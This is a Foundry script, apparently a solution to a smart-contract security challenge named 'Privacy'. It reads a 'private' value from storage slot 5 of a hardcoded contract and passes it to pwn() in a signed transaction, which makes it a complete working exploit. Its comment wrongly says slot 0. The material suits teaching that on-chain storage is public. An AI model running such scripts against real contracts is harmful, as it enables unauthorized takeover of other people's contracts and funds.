// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";

contract PrivacyScript is Script {
    function run() external {
        // Read storage at slot 0 from a contract
        address target = 0x0E34bA1CA65EB22cEE9de9D468AfF2cd88844655;
        bytes32 value = vm.load(target, bytes32(uint256(5)));
        console.log("Storage at slot 5:");
        console.logBytes32(value);
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        (bool success,) = target.call(abi.encodeWithSignature("pwn()", bytes16(value)));
        require(success, "Call failed");
        vm.stopBroadcast();
    }
}
